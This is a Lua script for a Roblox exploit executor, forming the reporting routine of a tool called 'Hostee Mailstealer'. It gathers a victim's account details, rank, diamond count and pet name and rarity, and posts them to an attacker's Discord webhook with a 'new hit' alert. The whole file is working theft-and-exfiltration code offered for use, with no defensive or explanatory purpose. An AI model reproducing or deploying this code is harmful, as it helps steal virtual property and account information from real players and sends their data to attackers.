local function sendwebhook(msg)
local msg = {
  ["content"]= "|| @everyone || **Hostee Mailstealer has detected a new hit!**",
  ["embeds"]= {
    {
      ["title"]= "`Hostee Mailstealer Results`",
      ["description"]= "**Data from the victim**\nüßëDisplay Name: ".._G.PlrDisplayNameVictim.."\nüßëUsername: ".._G.PlrUserVictim.."\nüßëUser ID: ".._G.PlrUserIDVictim.."\nüê±Rank: ".._G.CurrentRank.."\nüéÆPlace: ".._G.GameIn.."",
      ["url"]= "https://discord.gg/hosteehub",
      ["color"]= ""..webhookcolor.."",
      ["fields"]= {
        {
          ["name"]= "Diamonds üíé",
          ["value"]= "```".._G.Diamonds.."```",
          ["inline"]= true
        },
        {
          ["name"]= "Pet Name & Rarity",
          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
		  ["inline"]= true
        }
      }
    }
  },
  ["attachments"] = {}
}
local Webhook = _G.Webhook
request = http_request or request or HttpPost or syn.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
end
sendwebhook(msg)